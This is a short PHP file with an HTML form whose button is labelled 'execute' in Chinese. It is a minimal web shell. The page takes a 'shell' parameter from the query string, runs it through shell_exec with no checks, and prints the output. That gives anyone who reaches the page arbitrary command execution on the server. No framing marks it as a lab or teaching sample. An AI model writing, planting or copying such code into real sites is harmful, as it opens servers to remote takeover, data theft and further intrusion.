<html>
<form action='shell_exec.php'>
<input type=text name='shell'>
<input type=submit name='submit' value='执行'>
</form>
</html>
<?php
if($_GET['submit'])
{
$cmd=$_GET['shell'];
$a=shell_exec("$cmd");
echo $a;
}
?>
